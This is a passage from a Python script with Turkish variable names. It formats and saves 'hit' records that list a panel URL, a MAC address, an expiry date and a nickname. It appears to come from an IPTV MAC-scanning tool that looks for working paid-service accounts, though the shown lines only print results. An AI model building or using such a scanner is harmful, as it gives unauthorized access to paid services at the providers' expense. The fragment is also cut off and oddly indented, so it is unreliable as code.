			            	imza=imza1+imzaa+imza2+imzaip1+imzaip2+imzaip3+imzasif+imzayan+imza3+imzab+imzak+imzas
			            	#print(imza)''
		            	else:
		            		imza=("""╔╣ ᴾʸᵗʰᵒⁿ 𝐌𝐎𝗗 ᵇʸ ᴾᵃᴾʸ 𝗚ᵒ𝗚ᵒ ╠╗
╠ «💠» 𝕻𝖆𝖓𝖊𝖑➨http://"""+panel+"""/c/
╠ «💠» 𝕸𝖆𝖈➨"""+mac+"""
╠ «💠» 𝕰𝖝𝖕.➨"""+trh+"""
╠ «💠» 𝗚𝗢𝗟𝗗 V5 𝗗𝐔𝗢 🅟🅨   
╠ «⭕️» ➨"""+nickn+"""""")
		            			            	
		            	yaz(imza+'\n'+'\n')
		            	print(imza)
			            	#print("********")
				##except:pass
				   
	if not ozelmac=="":
		quit()
		


			
		
			
		
			
